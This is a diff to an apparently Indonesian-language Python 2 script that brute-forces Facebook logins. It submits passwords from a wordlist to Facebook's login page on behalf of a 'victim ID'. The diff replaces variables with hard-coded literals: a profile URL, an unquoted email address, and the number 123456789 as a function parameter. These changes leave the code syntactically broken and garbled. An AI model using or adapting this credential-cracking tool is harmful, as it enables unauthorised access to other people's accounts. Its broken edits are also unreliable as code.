@@ -13,7 +13,7 @@ print "CTRL+C Untuk Keluar"
 print "Thanks To Moreno77"
 
 
-email = str(raw_input("[*]=> Masukan ID Korban : "))
+email = str(raw_input("[*]=> https://www.facebook.com/aldoputra.berjambul : "))
 passwordlist = str(raw_input("List Password.txt : "))
 
 useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
@@ -21,10 +21,10 @@ useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1
 
 
 login = 'https://www.facebook.com/login.php?login_attempt=1'
-def attack(password):
+def attack(123456789):
 
   try:
-     sys.stdout.write("\r => trying %s.. " % password)
+     sys.stdout.write("\r => trying %s.. " % 123456789)
      sys.stdout.flush()
      br.addheaders = [('User-agent', random.choice(useragents))]
      site = br.open(login)
@@ -33,13 +33,13 @@ def attack(password):
       
          
      ##Facebook
-     br.form['email'] =email
-     br.form['pass'] = password
+     br.form['email'] =botgaming2120@gmail.com
+     br.form['pass'] = 123456789
      br.submit()
      log = br.geturl()
      if log == login:
         print "\n\n\n  => Password found .. !!"
-        print "\n  [*] Password => %s\n" % (password)
+        print "\n  [*] Password => %s\n" % (123456789)
         sys.exit(1)
   except KeyboardInterrupt:
         print "\n  => Exiting program .. "
@@ -83,15 +83,15 @@ def check():
         sys.exit(1)
     try:
         print GHT
-        print " [*] Account to crack : %s" % (email)
-        print " [*] Loaded :" , len(passwords), "passwords"
+        print " [*] Account to crack : %s" % (botgaming2120@gmail.com)
+        print " [*] Loaded :" , len(123456789), "passwords"
         print " [*] Cracking, please wait ..."
     except KeyboardInterrupt:
         print "\n [*] Exiting program ..\n"
         sys.exit(1)
     try:
         search()
-        attack(password)
+        attack(123456789)
     except KeyboardInterrupt:
         print "\n [*] Exiting program ..\n"
         sys.exit(1)
